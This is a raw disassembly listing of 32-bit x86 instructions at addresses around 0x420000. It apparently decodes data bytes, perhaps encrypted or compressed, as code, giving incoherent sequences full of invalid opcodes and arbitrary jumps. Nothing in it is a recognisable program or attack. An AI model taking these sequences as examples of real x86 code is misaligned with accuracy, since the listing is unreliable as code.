  4200e5:	popa   
  4200e6:	addr16 pop eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	xor    BYTE PTR [ecx+0x9145071],0xce
  4200f5:	stc    
  4200f6:	mov    ah,BYTE PTR [ebx-0x23861a43]
  4200fc:	or     al,0x30
  4200fe:	and    eax,0x18c14129
  420103:	pop    edi
  420104:	icebp  
  420105:	dec    edx
  420106:	pop    edx
  420107:	dec    edi
  420108:	ret    
  420109:	int3   
  42010a:	fsub   QWORD PTR [esi+ecx*4-0x7e]
  42010e:	sbb    al,0xd1
  420110:	and    eax,0x942d297c
  420115:	in     al,0x30
  420117:	pop    ebx
  420118:	dec    edi
  420119:	fsubr  QWORD PTR [esi]
  42011b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42011c:	adc    BYTE PTR [ecx],0xc4
  42011f:	arpl   WORD PTR [ecx+0x72886fe8],di
  420125:	es push ebp
  420127:	xchg   esp,eax
  420128:	mov    WORD PTR [ebx+0x68f4af9b],gs
  42012e:	and    DWORD PTR [edx+0x5e],0xf5b7a160
  420135:	xchg   ecx,eax
  420136:	shr    BYTE PTR [ebx+0x39],0x4e
  42013a:	xor    esi,DWORD PTR [ebx-0x5c1d18ee]
  420140:	jle    0x4201bf
  420142:	dec    esi
  420143:	xor    ebx,DWORD PTR [eax+esi*2]
  420146:	hlt    
  420147:	push   ds
  420148:	mov    ebp,DWORD PTR [edi-0x73c5d2b8]
  42014e:	shl    DWORD PTR [ebp+esi*1-0x46],0xd
  420153:	cdq    
  420154:	mov    bh,0xfa
  420156:	sub    ah,BYTE PTR [esi+edi*1]
  420159:	inc    ebx
  42015a:	pop    es
  42015b:	add    ch,dl
  42015d:	mov    BYTE PTR [edi],al
  42015f:	cs jns 0x4201c2
  420162:	pusha  
  420163:	loop   0x42014d
  420165:	jb     0x420165
  420167:	mov    esi,0x3637fef8
  42016c:	stc    
  42016d:	retf   
  42016e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42016f:	add    eax,0xbd0ae404
  420174:	repnz test al,0x97
  420177:	bound  esp,QWORD PTR [ebp+eax*4+0x8bfe632]
  42017e:	jge    0x4201bd
  420180:	addr16 push esp
  420182:	jns    0x420137
  420184:	cmc    
  420185:	pop    ecx
  420186:	rcr    BYTE PTR [ecx],0x16
  420189:	ins    BYTE PTR es:[edi],dx
  42018a:	repnz in al,0x72
  42018d:	jbe    0x420144
  42018f:	mov    ebx,fs
  420191:	imul   DWORD PTR [edx]
  420193:	mov    ds:0x5842b6b1,al
  420198:	xor    DWORD PTR ds:0x32a92cb3,ebp
  42019e:	ror    bl,0xb9
  4201a1:	sar    BYTE PTR ds:0x792aa210,cl
  4201a7:	xor    eax,0xd04368e2
  4201ac:	aam    0xe5
  4201ae:	dec    ecx
  4201af:	ds stos DWORD PTR es:[edi],eax
  4201b1:	jg     0x420188
  4201b3:	je     0x420146
  4201b5:	scas   eax,DWORD PTR es:[edi]
  4201b6:	jle    0x420228
  4201b8:	and    BYTE PTR [ebx-0x54b24ca5],bh
  4201be:	jl     0x420150
  4201c0:	mov    ecx,0x5ea9b413
  4201c5:	pushf  
  4201c6:	xchg   BYTE PTR [esi],dl
  4201c8:	lods   al,BYTE PTR ds:[esi]
  4201c9:	or     eax,0x6d9907fb
  4201ce:	div    DWORD PTR [edx+0x72cc6ddb]
  4201d4:	mov    esp,0x99120a07
  4201d9:	push   eax
  4201da:	pop    esp
  4201db:	lahf   
  4201dc:	mov    ebx,0xb5971a9
  4201e1:	jl     0x42022d
  4201e3:	int3   
  4201e4:	daa    
  4201e5:	ins    BYTE PTR es:[edi],dx
  4201e6:	mov    edi,0xc26fb707
  4201eb:	scas   al,BYTE PTR es:[edi]
  4201ec:	xchg   edx,eax
  4201ed:	int    0x0
	...
  420253:	add    BYTE PTR [eax],al
  420255:	add    BYTE PTR [ebx-0x31],dh
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x49990e19],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	inc    esp
  42026f:	ja     0x4202aa
  420271:	cmp    eax,0xe2154eae
  420276:	fstp   TBYTE PTR [esi-0x73]
  420279:	loopne 0x420290
  42027b:	arpl   WORD PTR [esi-0x31b35e27],bp
  420281:	or     BYTE PTR [eax-0x52],ch
  420284:	repnz inc edx
  420286:	addr16 ret 0x179
  42028a:	ss (bad) 
  42028c:	rcl    BYTE PTR [esp],0xf1
  420290:	out    dx,al
  420291:	ds inc edx
  420293:	dec    edi
  420294:	sbb    DWORD PTR [ecx],ebx
  420296:	imul   eax,DWORD PTR [edi+0x7eb0233d],0xa09522d9
  4202a0:	in     al,dx
  4202a1:	loopne 0x420229
  4202a3:	inc    esp
  4202a4:	pushw  0x62
  4202a7:	jnp    0x4202f6
  4202a9:	mov    DWORD PTR [ebp+0x52],eax
  4202ac:	dec    esi
  4202ad:	or     eax,0x9c952ce8
  4202b2:	pop    eax
  4202b3:	mov    ds:0xec0b38da,al
  4202b8:	sti    
  4202b9:	and    ebx,DWORD PTR [ebx]
  4202bb:	and    dl,BYTE PTR [edi+0x36535c93]
  4202c1:	dec    esi
  4202c2:	pushf  
  4202c3:	dec    ebp
  4202c4:	mov    edi,0x2f940e6b
  4202c9:	popf   
  4202ca:	adc    eax,esp
  4202cc:	or     cl,bl
  4202ce:	inc    ebp
  4202cf:	mov    ch,0xb1
  4202d1:	dec    edi
  4202d2:	cmp    al,0x5
  4202d4:	(bad)  
  4202d5:	ja     0x420263
  4202d7:	fnstsw WORD PTR [esi-0x61e5c809]
  4202dd:	clc    
  4202de:	and    al,ah
  4202e0:	jno    0x4202fe
  4202e2:	push   esp
  4202e3:	adc    ebp,DWORD PTR [edi-0x15]
  4202e6:	sbb    edx,edi
  4202e8:	mov    edi,0xcdb33adc
  4202ed:	xchg   esi,eax
  4202ee:	jmp    0x1f6e9d18
  4202f3:	xchg   edi,eax
  4202f4:	push   0xffffffab
  4202f6:	dec    ecx
  4202f7:	clc    
  4202f8:	xor    esp,ecx
  4202fa:	jge    0x42034b
  4202fc:	lea    ebx,[ebx]
  4202fe:	test   edx,0x68809fd4
  420304:	jecxz  0x4202b1
  420306:	cs push 0x73
  420309:	out    0xa0,al
  42030b:	adc    eax,0x5b51b8ef
  420310:	mov    esp,edi
  420312:	cld    
  420313:	pop    ds
  420314:	inc    edx
  420315:	prefetchnta BYTE PTR [eax-0x3bb7a1a0]
  42031c:	sub    al,0x77
  42031e:	sub    ebx,ebx
  420320:	or     al,cl
  420322:	out    dx,eax
  420323:	jo     0x420336
  420325:	xchg   esp,eax
  420326:	cmp    DWORD PTR [ebp+0x6d],ebp
  420329:	xor    al,0x14
  42032b:	lahf   
  42032c:	ret    
  42032d:	fmul   QWORD PTR [edi+0x57]
  420330:	out    dx,eax
  420331:	mov    eax,ds:0xd3e2031
  420336:	dec    esi
  420337:	add    al,BYTE PTR [esi+edx*4+0x5d30f5c2]
  42033e:	xchg   esp,eax
  42033f:	inc    ebx
  420340:	popa   
  420341:	pop    ss
  420342:	std    
  420343:	and    DWORD PTR [ecx],ebx
  420345:	pop    ebp
  420346:	(bad)  
  420347:	fucomp st(4)
  420349:	push   ebx
  42034a:	push   cs
  42034b:	icebp  
  42034c:	jmp    0x9208:0x7d9bb575
  420353:	sbb    BYTE PTR [edx],dl
  420355:	push   ebx
  420356:	ror    esi,1
  420358:	mov    al,dl
  42035a:	dec    esi
  42035b:	ret    
  42035c:	mov    cl,0x62
  42035e:	leave  
  42035f:	xlat   BYTE PTR ds:[ebx]
  420360:	pop    ss
  420361:	pop    edx
  420362:	shr    ah,cl
  420364:	mov    ecx,0x8fa5f9eb
  420369:	addr16 mov edi,0x10f0bb
	...
  4203d3:	add    BYTE PTR [eax],al
  4203d5:	add    BYTE PTR [ecx+0x6],al
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	fs xchg ecx,eax
  4203e4:	cli    
  4203e5:	(bad)  
  4203e6:	addr16 pop edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	div    ch
  4203f0:	enter  0xdaf2,0xb6
  4203f4:	lods   eax,DWORD PTR ds:[esi]
  4203f5:	(bad)  
  4203f6:	out    0x99,al
  4203f8:	push   0x3f773762
  4203fd:	in     al,0xdf
  4203ff:	int    0x87
  420401:	cmp    eax,0xadf8fe4f
  420406:	pushf  
  420407:	xchg   esp,eax
  420408:	pop    ss
  420409:	xor    al,0xc2
  42040b:	sbb    ebx,esi
  42040d:	xor    eax,0xec554a01
  420412:	push   edx
  420413:	mov    esi,0x5f224bdd
  420418:	stos   BYTE PTR es:[edi],al
  420419:	dec    ebx
  42041a:	mov    esp,0xbde71ede
  42041f:	iret   
  420420:	outs   dx,BYTE PTR ds:[esi]
  420421:	test   DWORD PTR [esi],esi
  420423:	setnp  dh
  420426:	ret    
  420427:	and    ah,bl
  420429:	push   ss
  42042a:	in     eax,dx
  42042b:	xchg   BYTE PTR [ecx+eiz*4+0x63],dl
  42042f:	aam    0x24
  420431:	jg     0x4203d9
  420433:	dec    edi
  420434:	in     eax,0xdd
  420436:	out    0x0,eax
  420438:	lods   eax,DWORD PTR ds:[esi]
  420439:	stos   DWORD PTR es:[edi],eax
  42043a:	std    
  42043b:	xor    al,0xe6
  42043d:	xor    dh,BYTE PTR [esi+0x6e5336d]
  420443:	pop    ebp
  420444:	loopne 0x42041c
  420446:	test   al,0xac
  420448:	pushf  
  420449:	sahf   
  42044a:	inc    eax
  42044b:	xchg   BYTE PTR [esi+0x30],dl
  42044e:	add    bh,BYTE PTR ds:0x4cb5c9d0
  420454:	(bad)  ds:0x1b05f0be
  42045a:	pop    eax
  42045b:	stos   BYTE PTR es:[edi],al
  42045c:	out    0x69,eax
  42045e:	pop    edi
  42045f:	(bad)  
  420460:	iret   
  420461:	mov    cl,0x9
  420463:	sbb    DWORD PTR [eax+ebx*8+0x60c68d47],esi
  42046a:	jp     0x4204b7
  42046c:	test   al,0x86
  42046e:	jno    0x4204dd
  420470:	xchg   ebp,eax
  420471:	ficomp WORD PTR [ebp+0x42]
  420474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420475:	sbb    DWORD PTR [edi+esi*2-0x3a52900e],edi
  42047c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42047d:	inc    eax
  42047e:	jb     0x4204f1
  420480:	dec    esp
  420481:	ja     0x420459
  420483:	add    BYTE PTR [eax+0x6aac7705],dh
  420489:	imul   ecx,DWORD PTR ds:0x7c844488,0xffffffe8
  420490:	mov    al,ds:0xf7b8c4a2
  420495:	fstp   QWORD PTR [ebx]
  420497:	sti    
  420498:	out    0x5b,eax
  42049a:	in     al,0xb3
  42049c:	dec    ebp
  42049d:	rcr    BYTE PTR ss:[ebx+eax*8-0x414d5971],1
  4204a5:	mov    DWORD PTR [ecx+0x26e77509],0x1fd6f197
  4204af:	clc    
  4204b0:	mov    esi,0x9be02e3
  4204b5:	int    0x84
  4204b7:	push   es
  4204b8:	cld    
  4204b9:	je     0x42048d
  4204bb:	mov    DWORD PTR [eax+ebp*2],esp
  4204be:	push   esp
  4204bf:	push   0x17
  4204c1:	xchg   esp,eax
  4204c2:	out    dx,eax
  4204c3:	cmp    eax,0x28f57bb9
  4204c8:	fs pop ds
  4204ca:	and    ah,0xba
  4204cd:	xchg   ebx,eax
  4204ce:	mov    eax,0xca5c8560
  4204d3:	inc    eax
  4204d4:	adc    ebx,DWORD PTR [esi-0x24]
  4204d7:	pusha  
  4204d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204d9:	push   edi
  4204da:	dec    esp
  4204db:	popa   
  4204dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204dd:	fwait
  4204de:	jmp    0x420532
  4204e0:	mov    ds:0x9a47597c,eax
  4204e5:	pop    ss
  4204e6:	push   esi
  4204e7:	mov    cl,0xce
  4204e9:	(bad)  
  4204ea:	xor    eax,0xe6f78d
	...
  420553:	add    BYTE PTR [eax],al
  420555:	add    BYTE PTR [esi+0x7f125794],ch
  42055b:	shr    edi,cl
  42055d:	mov    esp,0x5a7f6c39
  420562:	add    BYTE PTR [ecx-0x34],0x4f
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	shl    DWORD PTR [edi-0x42c1e1b0],cl
  420574:	and    al,BYTE PTR cs:[ebp+0x39]
  420578:	inc    ecx
  420579:	retf   
  42057a:	test   edi,edx
  42057c:	lahf   
  42057d:	fwait
  42057e:	pop    ds
  42057f:	mov    ds:0x74df36f0,al
  420584:	sbb    eax,0xa6bc06a4
  420589:	jle    0x4205f8
  42058b:	dec    edx
  42058c:	xor    bl,ah
  42058e:	(bad)  
  42058f:	jge    0x420576
  420591:	push   edx
  420592:	mov    eax,0xa1bee2ad
  420597:	stc    
  420598:	push   es
  420599:	ss and al,0x7a
  42059c:	sub    eax,0xfc2d50c5
  4205a1:	ror    al,0x28
  4205a4:	and    ch,BYTE PTR [edx+eax*8+0x1b6ed31d]
  4205ab:	jne    0x4205d9
  4205ad:	cli    
  4205ae:	mov    dl,0x44
  4205b0:	adc    dh,BYTE PTR [edx-0x271755e3]
  4205b6:	dec    ecx
  4205b7:	mov    ecx,0xf6c36607
  4205bc:	pop    ecx
  4205bd:	sar    DWORD PTR [ebp+0x1b],0x7f
  4205c1:	mov    edi,0xd41c2ddf
  4205c6:	mov    esi,0x141e26e1
  4205cb:	nop
  4205cc:	or     BYTE PTR [esi+0x7d],cl
  4205cf:	pop    ebp
  4205d0:	ds mov ebx,0x717681ce
  4205d6:	inc    ebp
  4205d7:	imul   ebx,DWORD PTR [edx],0xffffffa8
  4205da:	stos   DWORD PTR es:[edi],eax
  4205db:	fnsetpm(287 only) 
  4205dd:	aad    0x3
  4205df:	retf   0x657a
  4205e2:	jb     0x42064a
  4205e4:	inc    ebx
  4205e5:	fistp  WORD PTR [edx]
  4205e7:	scas   eax,DWORD PTR es:[edi]
  4205e8:	jnp    0x4205b4
  4205ea:	stc    
  4205eb:	inc    esp
  4205ec:	dec    edi
  4205ed:	inc    ecx
  4205ee:	sar    DWORD PTR [edx+0xaa2585b],cl
  4205f4:	pop    edi
  4205f5:	pop    edi
  4205f6:	ret    0x250f
  4205f9:	sub    dl,cl
  4205fb:	rcr    esi,0x93
  4205fe:	out    dx,eax
  4205ff:	lahf   
  420600:	pushf  
  420601:	adc    BYTE PTR [ecx],bl
  420603:	shr    BYTE PTR [esp+ebx*4+0x5c48a153],cl
  42060a:	inc    esp
  42060b:	test   BYTE PTR [esi-0xc1ce846],dl
  420611:	push   ds
  420612:	lods   al,BYTE PTR ds:[esi]
  420613:	pop    es
  420614:	add    ah,ch
  420616:	jno    0x420631
  420618:	mov    esp,0x21630a93
  42061d:	rcr    ch,cl
  42061f:	mov    al,ds:0x6cac5509
  420624:	jns    0x420689
  420626:	sub    al,0xca
  420628:	cmp    eax,0x9614ffb6
  42062d:	mov    eax,DWORD PTR [ebx-0x3a]
  420630:	test   al,0x3
  420632:	sub    eax,0xea4905ca
  420637:	push   es
  420638:	fisttp QWORD PTR [edi+0x2fafb9e5]
  42063e:	mov    ah,0xa7
  420640:	xor    eax,0xed973a78
  420645:	fwait
  420646:	in     al,0x16
  420648:	fidiv  DWORD PTR [ecx+0x72]
  42064b:	stc    
  42064c:	rcl    BYTE PTR [ecx],0x88
  42064f:	pop    ebp
  420650:	aas    
  420651:	(bad)  
  420652:	adc    ch,BYTE PTR [ecx]
  420654:	cli    
  420655:	add    BYTE PTR [edi+0x2f],al
  420658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420659:	int3   
  42065a:	aas    
  42065b:	es test dh,bh
  42065e:	int    0xb3
  420660:	shl    DWORD PTR [esi+0x19b794a0],1
  420666:	push   0x14e53df4
  42066b:	jmp    0x420676
  42066d:	popf   
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	mov    ecx,0x674e3cd4
  4206e7:	pop    esp
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	test   DWORD PTR [edi+0x3769995e],edx
  4206f4:	je     0x420681
  4206f6:	fstp   st(1)
  4206f8:	xor    eax,0xcc57cf1
  4206fd:	(bad)  
  4206fe:	sub    ch,BYTE PTR [ebp+0x3a]
  420701:	imul   edi,DWORD PTR [eax],0xb95fff9b
  420707:	jl     0x4206cc
  420709:	sar    ah,1
  42070b:	mov    ah,bh
  42070d:	adc    ebx,DWORD PTR [ecx+ecx*1]
  420710:	popf   
  420711:	enter  0x3b40,0xa2
  420715:	dec    ebp
  420716:	sbb    bl,BYTE PTR [edi-0x79]
  420719:	mov    ebx,DWORD PTR [ebp-0x46e5eaec]
  42071f:	leave  
  420720:	cmp    cl,BYTE PTR [ecx-0x46d73721]
  420726:	mov    bl,0x6
  420728:	adc    al,0x93
  42072a:	dec    ebp
  42072b:	mov    ch,0x6a
  42072d:	pop    ebx
  42072e:	loope  0x42076f
  420730:	inc    ebx
  420731:	pop    esp
  420732:	inc    ecx
  420733:	mov    eax,0x997d0e1b
  420738:	out    0xfe,al
  42073a:	jne    0x420738
  42073c:	mov    dl,0xa3
  42073e:	mov    dh,0xfc
  420740:	ret    0x2a02
  420743:	(bad)  
  420744:	ins    DWORD PTR es:[edi],dx
  420745:	sbb    al,0xe0
  420747:	push   ss
  420748:	mov    ebp,0x9b4e57bf
  42074d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074e:	sti    
  42074f:	mov    WORD PTR [edx],ss
  420751:	in     al,dx
  420752:	push   ss
  420753:	test   al,0x32
  420755:	imul   edx,ebx,0x5637bdd8
  42075b:	jecxz  0x420734
  42075d:	mov    ebx,0xfd7d57d5
  420762:	icebp  
  420763:	mov    BYTE PTR [ebx-0x2e0d57ec],0x64
  42076a:	jecxz  0x4206f3
  42076c:	rol    DWORD PTR [esi],1
  42076e:	cmp    al,0xf8
  420770:	jmp    0x420750
  420772:	fcmovb st,st(4)
  420774:	add    dl,BYTE PTR [edi+0x71]
  420777:	lods   eax,DWORD PTR ds:[esi]
  420778:	(bad)  [ecx-0x76b121ef]
  42077e:	push   esp
  42077f:	mov    ecx,0x657e2290
  420784:	inc    edi
  420785:	jbe    0x4207d6
  420787:	xor    ebx,esp
  420789:	(bad)  
  42078b:	addr16 jle 0x42074c
  42078e:	dec    esi
  42078f:	ja     0x4207b7
  420791:	imul   ebp,DWORD PTR [eax+esi*2-0x73],0x9e852902
  420799:	dec    ebx
  42079a:	dec    ebp
  42079b:	out    dx,eax
  42079c:	push   ebp
  42079d:	push   ebp
  42079e:	mov    esi,0x8819d248
  4207a3:	scas   al,BYTE PTR es:[edi]
  4207a4:	push   ebp
  4207a5:	pop    ss
  4207a6:	popf   
  4207a7:	inc    ebx
  4207a8:	add    al,0x9d
  4207aa:	out    0xdf,al
  4207ac:	jl     0x42072f
  4207ae:	(bad)  [edi-0x65b1a0b8]
  4207b4:	stos   BYTE PTR es:[edi],al
  4207b5:	je     0x4207a3
  4207b7:	push   0x4c
  4207b9:	and    eax,0x78f6ca40
  4207be:	test   DWORD PTR [eax],0x31e6c2aa
  4207c4:	cmp    BYTE PTR [eax+0x61e1ec76],bl
  4207ca:	push   ds
  4207cb:	mov    bl,0xf9
  4207cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ce:	sub    ah,dl
  4207d0:	inc    ebp
  4207d1:	stos   BYTE PTR es:[edi],al
  4207d2:	mov    esi,0x6a774913
  4207d7:	fs xchg ecx,eax
  4207d9:	loop   0x42080e
  4207db:	jbe    0x4207ca
  4207dd:	shl    ecx,1
  4207df:	rcl    BYTE PTR [eax-0xc],cl
  4207e2:	and    BYTE PTR ds:0x1d755c10,bh
  4207e8:	fistp  WORD PTR gs:[esi+ebp*4+0x78]
  4207ed:	inc    edi
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	pop    edx
  420863:	push   ss
  420864:	and    ebp,DWORD PTR [edi+0x67]
  420867:	pop    ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	fiadd  DWORD PTR [eax+ebx*1+0x21cdd80f]
  420875:	stos   BYTE PTR es:[edi],al
  420876:	leave  
  420877:	pop    DWORD PTR [esi]
  420879:	les    ecx,FWORD PTR [edi-0x5cba1bc9]
  42087f:	and    eax,0x9c3cdab9
  420884:	sbb    al,0x55
  420886:	or     BYTE PTR [esi-0x75964376],dh
  42088c:	outs   dx,DWORD PTR ds:[esi]
  42088d:	test   DWORD PTR [eax+0x7cfda352],eax
  420893:	mov    DWORD PTR [ecx+0x640bc35e],eax
  420899:	stos   DWORD PTR es:[edi],eax
  42089a:	mov    ds:0xe286acac,eax
  42089f:	ins    DWORD PTR es:[edi],dx
  4208a0:	(bad)  
  4208a1:	jge    0x420835
  4208a3:	inc    edx
  4208a4:	pop    es
  4208a5:	jnp    0x4208d7
  4208a7:	in     al,0xb2
  4208a9:	repnz imul esi,DWORD PTR [ecx+0x23],0xa3f4d98
  4208b1:	ins    DWORD PTR es:[edi],dx
  4208b2:	cmp    esp,DWORD PTR [ebx+0x33b91bff]
  4208b8:	lods   eax,DWORD PTR ds:[esi]
  4208b9:	and    BYTE PTR [edx-0x3e3492f9],cl
  4208bf:	in     eax,0xf7
  4208c1:	sbb    eax,0xd5c1494f
  4208c6:	sbb    edi,edx
  4208c8:	out    0xaf,al
  4208ca:	jns    0x420868
  4208cc:	adc    eax,edx
  4208ce:	or     BYTE PTR [ecx-0x1f43d42c],bh
  4208d4:	pop    ss
  4208d5:	add    al,al
  4208d7:	or     al,0xe4
  4208d9:	cs cmp edi,ebx
  4208dc:	or     BYTE PTR [ebx+0x3b],cl
  4208df:	sub    eax,0xb9a67a7b
  4208e4:	cmc    
  4208e5:	and    bl,dh
  4208e7:	call   0x3e0:0x7b5e164d
  4208ee:	pop    ds
  4208ef:	sub    BYTE PTR [eax+eax*2],0x5d
  4208f3:	call   0x21f7e2b
  4208f8:	pop    ds
  4208f9:	jae    0x4208ba
  4208fb:	dec    eax
  4208fc:	mov    dl,bl
  4208fe:	push   edx
  4208ff:	frstor [esi]
  420901:	and    eax,esp
  420903:	cmc    
  420904:	xchg   ebp,eax
  420905:	shl    DWORD PTR [eax-0x69],0xbd
  420909:	(bad)  
  42090a:	pop    ecx
  42090b:	inc    ecx
  42090c:	popf   
  42090d:	clc    
  42090e:	mov    ds:0xcd06380f,al
  420913:	jmp    0xa83e1e4c
  420918:	xor    ch,BYTE PTR [edi]
  42091a:	fmul   QWORD PTR [edi]
  42091c:	(bad)  
  42091d:	jmp    0x282c451d
  420922:	xor    eax,0x35853a48
  420927:	out    dx,eax
  420928:	inc    edi
  420929:	push   esi
  42092a:	imul   esp,eax,0x120f6de5
  420930:	adc    ecx,DWORD PTR [edi-0x51]
  420933:	cld    
  420934:	mov    ecx,0xc41947ad
  420939:	shr    DWORD PTR [ebx+0x1c64a7fd],cl
  42093f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420940:	retf   
  420941:	lock and al,BYTE PTR [ebx]
  420944:	gs xchg edi,eax
  420946:	pusha  
  420947:	in     eax,0x2f
  420949:	pop    esp
  42094a:	js     0x4209bb
  42094c:	mov    esi,0x90994f8e
  420951:	pop    esp
  420952:	dec    esp
  420953:	pop    esi
  420954:	push   edx
  420955:	mov    ds:0xcd87f3fd,al
  42095a:	repnz pop edi
  42095c:	dec    edi
  42095d:	add    BYTE PTR [edi+0x32b8c37f],bl
  420963:	push   ebp
  420964:	push   edx
  420965:	ss cld 
  420967:	push   es
  420968:	xchg   ecx,eax
  420969:	adc    DWORD PTR [ebx],ebx
  42096b:	push   es
  42096c:	aas    
  42096d:	lods   eax,DWORD PTR ds:[esi]
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x38
  4209e3:	add    eax,0x5e678000
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	sub    eax,0xec71432
  4209f3:	sahf   
  4209f4:	inc    eax
  4209f5:	cwde   
  4209f6:	out    0x16,al
  4209f8:	xchg   edx,eax
  4209f9:	xchg   ebx,eax
  4209fa:	jle    0x420a30
  4209fc:	mov    esp,0x645347c0
  420a01:	arpl   WORD PTR [edx],di
  420a03:	mov    ss,WORD PTR [eax+0x77]
  420a06:	pop    ebx
  420a07:	xor    dl,cl
  420a09:	adc    DWORD PTR [esi+eax*1],esp
  420a0c:	ds clc 
  420a0e:	mov    cl,0x4a
  420a10:	scas   eax,DWORD PTR es:[edi]
  420a11:	int3   
  420a12:	out    0x8d,al
  420a14:	jge    0x4209bb
  420a16:	int    0x90
  420a18:	cmp    al,bl
  420a1a:	mov    edx,DWORD PTR [esi-0x61]
  420a1d:	imul   edx,ebx,0x91e9c3dd
  420a23:	clc    
  420a24:	sbb    al,0xa
  420a26:	inc    esi
  420a27:	sti    
  420a28:	cmp    eax,0x41a09ffe
  420a2d:	fcomp  QWORD PTR [ecx+ebp*4+0x3a]
  420a31:	sub    eax,eax
  420a33:	xor    ah,BYTE PTR ds:[ebp-0x6b29f1b0]
  420a3a:	jo     0x420a6b
  420a3c:	xchg   edi,eax
  420a3d:	repz xor esp,DWORD PTR [ebx+0x34]
  420a41:	pop    ebx
  420a42:	rol    DWORD PTR [esi-0x27fa20b7],0x1
  420a49:	aam    0x2e
  420a4b:	xor    eax,0xbed6af9f
  420a50:	xchg   esi,eax
  420a51:	mov    dl,0x74
  420a53:	or     esi,DWORD PTR [esi]
  420a55:	cs pop esi
  420a57:	dec    eax
  420a58:	mov    BYTE PTR [edi-0x2f],cl
  420a5b:	out    0xec,eax
  420a5d:	retf   0x67a
  420a60:	nop
  420a61:	jmp    0xf2b17e89
  420a66:	mov    bh,0xf5
  420a68:	repz loope 0x420a52
  420a6b:	xor    ebx,edx
  420a6d:	enter  0xf31e,0xe0
  420a71:	inc    ebp
  420a72:	mov    ds:0x6024a6e8,al
  420a77:	xlat   BYTE PTR ds:[ebx]
  420a78:	inc    edx
  420a79:	ror    BYTE PTR [edi],cl
  420a7b:	fwait
  420a7c:	aam    0x33
  420a7e:	out    0x20,eax
  420a80:	mov    ds:0xba7d37e5,al
  420a85:	shl    BYTE PTR [eax],cl
  420a87:	es out dx,eax
  420a89:	jmp    0x399b:0x7566c3ed
  420a90:	mov    gs,WORD PTR [edi+0x1d743047]
  420a96:	in     al,0x8e
  420a98:	mov    bl,0x44
  420a9a:	xchg   edi,eax
  420a9b:	cmc    
  420a9c:	repz xor BYTE PTR [edx+0x66],ch
  420aa0:	sub    BYTE PTR [eax],al
  420aa2:	or     al,0x49
  420aa4:	cwde   
  420aa5:	daa    
  420aa6:	in     eax,dx
  420aa7:	loop   0x420afc
  420aa9:	inc    eax
  420aaa:	dec    esi
  420aab:	push   0x74
  420aad:	out    dx,al
  420aae:	pop    edi
  420aaf:	mov    BYTE PTR [edi+0x34],ah
  420ab2:	sub    al,0xa6
  420ab4:	xor    bl,dl
  420ab6:	jmp    0x420ae5
  420ab8:	aas    
  420ab9:	xlat   BYTE PTR ds:[ebx]
  420aba:	jmp    0x420a58
  420abc:	and    esi,DWORD PTR [eax+0x7a]
  420abf:	dec    eax
  420ac0:	idiv   BYTE PTR [eax]
  420ac2:	push   ss
  420ac3:	imul   esp,DWORD PTR [ecx-0x78d318b4],0x4d91b68
  420acd:	pop    es
  420ace:	stos   BYTE PTR es:[edi],al
  420acf:	push   esp
  420ad0:	push   ebx
  420ad1:	pop    edx
  420ad2:	int    0xa0
  420ad4:	repz std 
  420ad6:	fstp   QWORD PTR [ebx]
  420ad8:	push   0xcbe4752a
  420add:	popa   
  420ade:	in     eax,0x4f
  420ae0:	dec    ebp
  420ae1:	or     al,0xff
  420ae3:	adc    edi,ebp
  420ae5:	test   DWORD PTR [eax+0x91bc252],ebx
  420aeb:	into   
  420aec:	mov    eax,ds:0x88
	...
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	iret   
  420b63:	inc    edx
  420b64:	mov    cs,WORD PTR [esi+0x15f67]
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	sbb    edi,DWORD PTR [esi+0x5b]
  420b71:	loope  0x420bf2
  420b73:	daa    
  420b74:	cld    
  420b75:	push   esi
  420b76:	mov    eax,ds:0xf026442e
  420b7b:	not    BYTE PTR [esi+0x16]
  420b7e:	cdq    
  420b7f:	jno    0x420bd8
